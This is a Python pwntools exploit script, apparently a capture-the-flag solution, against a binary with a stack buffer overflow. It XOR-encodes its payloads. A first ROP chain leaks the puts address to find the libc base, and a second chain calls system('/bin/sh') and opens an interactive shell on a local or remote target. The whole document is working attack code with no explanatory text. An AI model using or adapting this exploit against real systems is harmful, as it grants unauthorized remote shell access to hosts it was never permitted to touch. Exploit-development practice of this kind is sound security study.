from pwn import *
import sys

puts_got = 0x600c08
puts_plt = 0x400520
pop_rdi = 0x0000000000400803 # pop rdi; ret;
pop_rsi = 0x0000000000400801 # pop rsi; pop r15; ret;
func = 0x4006ab


if len(sys.argv) == 2:
  r = process(sys.argv[1])
  f = ELF(sys.argv[1])
  libc = f.libc
elif len(sys.argv) == 3:
  r = remote(sys.argv[1], sys.argv[2])
  libc = ELF('./libc.so.6')
else:
  print('Usage:', sys.argv[0], 'ip port')
  print('OR')
  print('Usage:', sys.argv[0], '/path/to/file')
  sys.exit(0)

#r = process('./vuln')
#libc = ELF('./libc.so.6')
#libc = ELF('/usr/lib/libc.so.6')

_p = b''
_p += b'A'*152
_p += p64(pop_rdi)
_p += p64(puts_got)
_p += p64(puts_plt)
_p += p64(func)

p = b''
for i in _p:
  p += bytes([(i ^ 1337) & 0xff])

r.recvuntil(': ')
r.sendline(p)

r.recvuntil(']\n')
leak = u64(r.read(6).ljust(8, b'\x00'))
base = leak - libc.symbols['puts']

print('[+] LEAK:', hex(leak))
print('[+] BASE:', hex(base))

_p = b''
_p += b'A'*152
_p += p64(pop_rsi)
_p += b'JUNKJUNK'*2
_p += p64(pop_rdi)
_p += p64(next(libc.search(b'/bin/sh\0')) + base)
_p += p64(libc.symbols['system'] + base)

p = b''
for i in _p:
  p += bytes([(i ^ 1337) & 0xff])

r.recvuntil(': ')
r.sendline(p)

r.interactive()
